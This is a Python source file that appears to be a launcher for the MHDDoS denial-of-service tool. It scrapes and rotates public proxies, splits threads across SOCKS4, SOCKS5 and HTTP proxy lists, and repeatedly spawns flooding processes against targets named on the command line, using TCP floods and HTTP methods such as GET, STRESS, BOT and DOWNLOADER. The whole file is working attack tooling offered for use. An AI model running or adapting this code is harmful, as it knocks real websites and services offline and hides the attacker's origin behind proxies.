import argparse
import multiprocessing
import os
import random
import shutil
import subprocess
import time


def update_proxies(period):
    os.chdir('proxy-scraper-checker')
    last_update = os.path.getctime('../MHDDoS/files/proxies')
    # Avoid parsing proxies too often when restart happens
    if (time.time() - last_update) > period / 2:
        subprocess.run(['python3', 'main.py'])
        shutil.rmtree('../MHDDoS/files/proxies', ignore_errors=True)
        shutil.move('./proxies', '../MHDDoS/files/')
        print('Proxies updated successfully')
    os.chdir('../')


def calculate_threads(total_threads, total_targets):
    s4_proxies = sum(1 for _ in open('files/proxies/socks4.txt'))
    s5_proxies = sum(1 for _ in open('files/proxies/socks5.txt'))
    http_proxies = sum(1 for _ in open('files/proxies/http.txt'))
    total_proxies = s4_proxies + s5_proxies + http_proxies
    if not total_proxies:
        raise RuntimeError('No proxies found. Check -proxy-timeout and -skip-proxy-init flags')

    threads_per_proxy = total_threads / total_targets / total_proxies
    s4_threads = str(int(s4_proxies * threads_per_proxy))
    s5_threads = str(int(s5_proxies * threads_per_proxy))
    http_threads = str(int(http_proxies * threads_per_proxy))
    return s4_threads, s5_threads, http_threads


def run_ddos(targets, total_threads, period, rpc, http_methods):
    os.chdir('MHDDoS')

    period = str(period)
    rpc = str(rpc)

    s4_threads, s5_threads, http_threads = calculate_threads(total_threads, len(targets))
    processes = []
    for target in targets:
        for socks_type, socks_file, threads in (
            ('4', 'socks4.txt', s4_threads),
            ('5', 'socks5.txt', s5_threads),
            ('1', 'http.txt', http_threads),
        ):
            if target.lower().startswith('tcp://'):
                process = subprocess.Popen(
                    ['python3', 'start.py', 'TCP', target[6:], threads, period, socks_type, socks_file]
                )
            else:
                method = random.choice(http_methods)
                process = subprocess.Popen(
                    ['python3', 'start.py', method, target, socks_type, threads, socks_file, rpc, period]
                )

            processes.append(process)

    for p in processes:
        p.wait()

    os.chdir('../')


def start(threads_per_core, period, targets, rpc, http_methods):
    shutil.copy('proxy_config.py', 'proxy-scraper-checker/config.py')

    total_threads = threads_per_core * multiprocessing.cpu_count()
    while True:
        update_proxies(period)
        run_ddos(targets, total_threads, period, rpc, http_methods)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'targets',
        nargs='+',
        help='List of targets, separated by spaces',
    )
    parser.add_argument(
        '-t',
        dest='threads',
        type=int,
        default=100,
        help='Number of threads per CPU core (default is 100)',
    )
    parser.add_argument(
        '-p',
        dest='period',
        type=int,
        default=600,
        help='How often to update the proxies (default is 300)',
    )
    parser.add_argument(
        '--proxy-timeout',
        dest='proxy_timeout',
        metavar='PROXY_TIMEOUT',
        type=float,
        default=3,
        help='How many seconds to wait for the proxy to make a connection. '
             'Higher values give more proxies, but with lower speed/quality. It also takes more time (default is 3)',
    )
    parser.add_argument(
        '--rpc',
        dest='rpc',
        type=int,
        default=100,
        help='How many requests to send on a single proxy connection (default is 100)',
    )
    parser.add_argument(
        '--http-methods',
        nargs='+',
        default=['GET', 'STRESS', 'BOT', 'DOWNLOADER'],
        help='List of HTTP(s) attack methods to use. Default is GET, STRESS, BOT, DOWNLOADER',
    )
    return parser


if __name__ == '__main__':
    args = init_argparse().parse_args()
    os.putenv('PROXY_TIMEOUT', str(args.proxy_timeout))
    start(
        args.threads,
        args.period,
        args.targets,
        args.rpc,
        args.http_methods,
    )
